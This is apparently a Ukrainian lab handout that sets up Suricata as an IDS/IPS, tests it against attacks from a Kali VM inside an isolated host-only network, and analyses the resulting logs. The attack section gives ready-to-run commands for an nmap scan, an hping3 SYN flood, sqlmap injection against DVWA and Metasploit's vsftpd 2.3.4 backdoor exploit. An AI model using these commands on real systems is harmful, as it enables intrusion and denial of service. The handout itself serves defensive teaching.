# Лабораторна №6 - команди для відтворення

> Усі атаки виконуються ТІЛЬКИ в ізольованій host-only мережі між власними VM.
> Атакуюча: Kali Linux (192.168.56.10). Захищена: Ubuntu + Suricata (192.168.56.20),
> на ній веб-додаток DVWA і vsftpd 2.3.4 (або окрема VM Metasploitable 2 як ціль за IPS).

## 1. Встановлення і правила (захищена машина)
```bash
sudo apt update && sudo apt install -y suricata jq
sudo suricata-update                         # ET Open rules (community-набір для Suricata)
sudo cp local.rules /etc/suricata/rules/local.rules
# у /etc/suricata/suricata.yaml:  rule-files: [ suricata.rules, local.rules ]
sudo suricata -T -c /etc/suricata/suricata.yaml   # перевірка конфігурації
```
Для Snort: `wget https://www.snort.org/downloads/community/community-rules.tar.gz`

## 2. Режим моніторингу (IDS)
```bash
ip a                                          # визначити інтерфейс, напр. enp0s8
sudo suricata -c /etc/suricata/suricata.yaml -i enp0s8
sudo tail -f /var/log/suricata/fast.log
```

## 3. Режим IPS (NFQUEUE)
```bash
sudo iptables -I INPUT  -j NFQUEUE --queue-num 0
sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0
sudo suricata -c /etc/suricata/suricata.yaml -q 0
# після завершення роботи:
sudo iptables -D INPUT -j NFQUEUE --queue-num 0; sudo iptables -D OUTPUT -j NFQUEUE --queue-num 0
```

## 4. Експерименти (з Kali)
```bash
# 1) Сканування портів
nmap -sS -p 1-1000 192.168.56.20
nmap -sV 192.168.56.20

# 2) DoS (короткий, ~10 с)
sudo timeout 10 hping3 -S --flood -p 80 192.168.56.20

# 3) SQL-ін'єкція (DVWA, security=low)
sqlmap -u "http://192.168.56.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<id>; security=low" --batch --dbs

# 4) Експлойт (vsftpd 2.3.4)
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.56.20; run; exit"
```

## 5. Аналіз журналів (захищена машина)
```bash
sudo grep -c "LAB6" /var/log/suricata/fast.log
sudo jq -c 'select(.event_type=="alert") | {t:.timestamp,sig:.alert.signature,src:.src_ip,act:.alert.action}' \
        /var/log/suricata/eve.json | tail -30
sudo grep -i "drop" /var/log/suricata/fast.log | tail
```
